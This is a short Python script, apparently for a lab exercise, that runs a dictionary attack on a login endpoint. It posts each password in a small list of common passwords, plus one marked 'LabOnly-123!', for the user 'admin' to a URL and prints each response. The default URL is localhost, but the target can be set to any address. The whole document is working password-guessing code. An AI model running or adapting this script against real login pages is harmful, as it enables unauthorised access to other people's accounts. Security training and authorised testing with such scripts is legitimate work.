import argparse, requests
if __name__=="__main__":
    ap=argparse.ArgumentParser(); ap.add_argument("--url",default="http://127.0.0.1:5000/login"); a=ap.parse_args()
    wordlist=["123456","password","admin","letmein","LabOnly-123!"]
    for p in wordlist:
        r=requests.post(a.url,json={"username":"admin","password":p},timeout=5)
        print(p,"->",r.status_code,r.text)
